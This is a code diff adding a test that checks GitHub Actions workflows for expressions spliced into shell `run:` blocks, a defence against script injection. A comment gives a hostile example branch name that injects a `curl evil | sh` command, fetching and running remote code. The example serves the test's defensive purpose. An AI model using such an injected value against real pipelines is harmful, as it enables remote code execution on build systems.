@@ -65,6 +65,46 @@ async function readRepoFile(relative: string): Promise<string> {
   return Bun.file(new URL(`../${relative}`, import.meta.url)).text();
 }
 
+test("no workflow splices an expression into a shell script", async () => {
+  // `${{ github.event.pull_request.head.ref }}` inside a `run:` block is substituted before the
+  // shell parses the line, so a branch named `x"; curl evil | sh; #` executes. This repo is public,
+  // so anyone can open a PR and choose that name. Passing the value through `env:` makes it one
+  // argument whatever it contains.
+  //
+  // Walks indentation rather than matching the block with one regular expression. The obvious
+  // pattern — `run: \|[\s\S]*?(?=...|$)` — is silently vacuous: under the `m` flag `$` matches at
+  // the end of *every* line, so the lazy quantifier stops immediately and the guard inspects the
+  // string "run: |" and nothing else. It passed a planted injection before this was rewritten,
+  // which is LD-11's point about proving a gate against the shape it actually guards.
+  // `dot: true` is load-bearing: Bun.Glob.scan skips dot-directories by default, so without it the
+  // scan never enters `.github/` and yields nothing. The guard passed a planted injection twice
+  // before this flag was added — once for the regex above, once for this.
+  const workflows: string[] = [];
+  for await (const path of new Bun.Glob(".github/workflows/*.yml").scan({ cwd: ".", dot: true })) {
+    workflows.push(path);
+  }
+  expect(workflows.length).toBeGreaterThan(0);
+
+  const offenders: string[] = [];
+  for (const path of workflows) {
+    const lines = (await readRepoFile(path)).split("\n");
+    let blockIndent: number | undefined;
+    for (const line of lines) {
+      const indent = line.length - line.trimStart().length;
+      if (blockIndent !== undefined && line.trim() !== "" && indent <= blockIndent) {
+        blockIndent = undefined;
+      }
+      if (blockIndent !== undefined && line.includes("${{")) {
+        offenders.push(`${path}: ${line.trim()}`);
+      }
+      if (/^ *run: \|/.test(line)) {
+        blockIndent = indent;
+      }
+    }
+  }
+  expect(offenders).toEqual([]);
+});
+
 test("CI runs on every pull request, not only those targeting main", async () => {
   const workflow = await readRepoFile(".github/workflows/ci.yml");
   const afterTrigger = workflow.slice(workflow.indexOf("pull_request:") + "pull_request:".length);
